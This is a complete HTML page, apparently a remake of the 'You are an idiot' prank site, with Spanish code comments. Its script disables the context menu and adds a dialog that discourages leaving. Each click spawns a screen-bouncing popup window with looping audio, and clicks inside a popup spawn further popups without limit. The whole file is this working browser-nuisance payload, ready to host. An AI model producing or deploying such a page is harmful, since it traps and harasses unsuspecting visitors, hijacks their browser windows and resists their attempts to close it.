<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <meta charset="UTF-8">
    <meta name="google" content="notranslate">
    
    <!-- Ice Cream Roll Cool Launcher -->
    
    <meta name="description" content="This is the orgional and the best flash video on the 'net. Once found on www.youdontknowwhoiam.org, not found where it belong, right here on...">
    <link rel="icon" type="image/png" href="icecream.png">
    <title>You are an idiot! (dot org)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #fff; overflow: hidden; height: 100vh; width: 100vw; cursor: default; user-select: none; display: flex; justify-content: center; align-items: center; position: relative; }
        .speaker-btn { position: absolute; top: 20px; left: 20px; font-size: 35px; background: none; border: none; cursor: default; z-index: 10000; }
        .main-container { width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; padding: 0; }
        
        /* ESCUDO DE PROTECCIÓN MULTIMEDIA VIA CSS */
        img { max-width: 100%; height: 100vh; object-fit: contain; display: block; pointer-events: none; user-select: none; -webkit-user-drag: none; }
    </style>
</head>
<body>

    <button id="speaker-button" class="speaker-btn">🔇</button>

    <div class="main-container">
        <img id="home-gif" src="You_Are_An_Idiot_screen.gif" alt="Idiot!" draggable="false">
    </div>

    <audio id="bg-audio" src="you-are-an-idiot.mp3" loop preload="auto"></audio>

    <script>
        const audio = document.getElementById('bg-audio'), homeGif = document.getElementById('home-gif');
        const speakerBtn = document.getElementById('speaker-button');
        const popups = [], P_WD = 400, P_HT = 300;

        // DIÁLOGO NATIVO DE CONFIRMACIÓN EXCLUSIVO DEL HOME
        function controladorSalidaHome(event) {
            const message = "¿Realmente quieres salir del sitio web?";
            event.preventDefault();
            event.returnValue = message; 
            return message;
        }
        window.addEventListener('beforeunload', controladorSalidaHome);

        // Desactivación del menú de contexto secundario
        window.addEventListener('contextmenu', (e) => { e.preventDefault(); });

        function playHomeAudio() {
            if (audio.paused) {
                audio.load();
                audio.play()
                    .then(() => { speakerBtn.textContent = "🔊"; })
                    .catch(err => console.log("Audio retenido por el navegador:", err));
            }
        }

        speakerBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            if (audio.paused) { playHomeAudio(); } 
            else { audio.pause(); speakerBtn.textContent = "🔇"; }
        });

        // FUNCIÓN GLOBAL DE CONTROL DE POP-UPS REBOTANTES
        window.spawnPopup = function() {
            const scrW = window.screen.availWidth, scrH = window.screen.availHeight;
            let pX = Math.max(0, Math.floor(Math.random() * (scrW - P_WD))), pY = Math.max(0, Math.floor(Math.random() * (scrH - P_HT)));
            
            // VELOCIDAD CONSTANTE 42 PÍXELES DE YOUAREANIDIOT.CC
            let spX = Math.random() > 0.5 ? 42 : -42; 
            let spY = Math.random() > 0.5 ? 42 : -42;

            const favUrl = window.location.origin + window.location.pathname.split('/').slice(0, -1).join('/') + '/icecream.png';
            const gifUrl = homeGif.src;
            const audioUrl = audio.src;

            const win = window.open('', `_blank_${Math.random().toString(36).substring(2,9)}`, `width=${P_WD},height=${P_HT},left=${pX},top=${pY},toolbar=0,scrollbars=0,status=0,resizable=1,popup=true`);
            
            if (win) {
                win.document.write(`
                    <html translate="no">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="google" content="notranslate">
                        <link rel="icon" type="image/png" href="${favUrl}">
                        <title>Idiot!</title>
                        <style>
                            *{margin:0;padding:0;}
                            body{background:#fff;overflow:hidden;display:flex;justify-content:center;align-items:center;height:100vh;cursor:default;user-select:none;}
                            div{padding:20px;height:100%;width:100%;display:flex;justify-content:center;align-items:center;}
                            img{max-width:100%;max-height:100%;object-fit:contain;pointer-events:none;user-select:none;-webkit-user-drag:none;}
                        </style>
                    </head>
                    <body>
                        <div><img src="${gifUrl}" draggable="false"></div>
                        <script>
                            window.addEventListener('contextmenu', (e) => { e.preventDefault(); });

                            window.addEventListener('resize', () => {
                                if (window.innerWidth > 400 + 50 || window.innerHeight > 300 + 50) {
                                    window.resizeTo(400, 300);
                                }
                            });

                            // RESPUESTA DIRECTA ILIMITADA: Cada clic dentro de la ventana abre otra inmediatamente
                            window.addEventListener('click', (e) => {
                                try {
                                    if (window.opener && !window.opener.closed) {
                                        window.opener.spawnPopup();
                                    } else {
                                        window.open(window.location.href, '_blank', 'width=400,height=300,popup=true');
                                    }
                                } catch(err){}
                            });

                            let pX = ${pX}, pY = ${pY}, spX = ${spX}, spY = ${spY};
                            
                            function bounceBypassLoop() {
                                const sW = window.screen.availWidth, sH = window.screen.availHeight;
                                pX += spX; pY += spY;
                                if (pX <= 0 || pX + 400 >= sW) spX = -spX;
                                if (pY <= 0 || pY + 300 >= sH) spY = -spY;
                                window.moveTo(pX, pY);
                            }

                            setInterval(bounceBypassLoop, 16);
                        <\/script>
                    </body>
                    </html>
                `);
                win.document.close();

                const popupAudioTrack = document.createElement('audio');
                popupAudioTrack.src = audioUrl;
                popupAudioTrack.loop = true;
                document.body.appendChild(popupAudioTrack);
                
                popupAudioTrack.play().catch(err => console.log("Audio block bypass:", err));

                popups.push({ win, pX, pY, spX, spY, audioObj: popupAudioTrack });

                window.removeEventListener('beforeunload', controladorSalidaHome);
                setTimeout(() => {
                    window.addEventListener('beforeunload', controladorSalidaHome);
                }, 50);
            }
        };

        // DISPARADOR DIRECTO SIN LÍMITES EN EL HOME: Cada clic en la pantalla abre un pop-up al instante
        window.addEventListener('click', (e) => {
            // Evitamos que el clic en el botón de silenciar abra una ventana
            if (e.target === speakerBtn) return;
            
            playHomeAudio();
            window.spawnPopup();
        });

        // GESTIÓN DE CIERRES PACÍFICOS
        setInterval(() => {
            for (let i = popups.length - 1; i >= 0; i--) {
                const p = popups[i];
                if (p.win.closed) { 
                    try { p.audioObj.pause(); p.audioObj.remove(); } catch(err) {}
                    popups.splice(i, 1); 
                }
            }
        }, 100);
    </script>
</body>
</html>
